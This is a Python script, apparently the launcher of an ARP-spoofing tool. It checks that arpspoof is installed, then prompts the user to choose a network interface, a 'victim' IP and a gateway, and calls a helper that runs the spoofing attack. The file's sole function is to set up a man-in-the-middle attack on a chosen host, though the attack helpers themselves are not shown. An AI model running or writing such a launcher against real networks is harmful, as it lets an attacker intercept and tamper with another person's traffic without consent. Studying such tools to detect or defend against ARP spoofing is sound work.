from language.language import SELECT_AN_OPTION
from language.language import NO_INTERFACES_WERE_FOUND
from language.language import SELECT_AN_INTERFACE
from language.language import WELCOME
from language.language import MENU
from language.language import FOR_ARPSPOOF_CHECK_THIS
from language.language import SELECT_A_VICTIM
from language.language import SELECT_THE_GATEWAY
from tools.util import retrieve_interfaces
from tools.util import check_arpspoof
from tools.util import choose_option
from tools.util import choose_ip
from tools.util import create_options_list
from tools.util import run_single_arpspoof
from tools.config_manager import SYS_NAME

print(WELCOME)

if not check_arpspoof():
    if SYS_NAME == "nt":
        print(FOR_ARPSPOOF_CHECK_THIS % "https://github.com/alandau/arpspoof")
    elif SYS_NAME != "Darwin":
        print(FOR_ARPSPOOF_CHECK_THIS % "https://command-not-found.com/dsniff")
    else:
        print(FOR_ARPSPOOF_CHECK_THIS % "https://ports.macports.org/port/dsniff/")
    exit(0)

print(SELECT_AN_OPTION)
print(MENU)
option = choose_option(["1", "2", "E"])

if option == "E":
    exit(0)

INTERFACES = retrieve_interfaces()
WORKING_INTERFACE = None

if not INTERFACES and SYS_NAME != "nt":
    print(NO_INTERFACES_WERE_FOUND)
    exit(0)
elif SYS_NAME != "nt":
    printable_list, options, options_values = create_options_list(INTERFACES)
    print(printable_list)
    print(SELECT_AN_INTERFACE)
    WORKING_INTERFACE = choose_option(options, options_values, to_uppercase=False)

victim = choose_ip(SELECT_A_VICTIM, WORKING_INTERFACE)
gateway = choose_ip(SELECT_THE_GATEWAY, WORKING_INTERFACE)

run_single_arpspoof(victim, gateway, WORKING_INTERFACE)
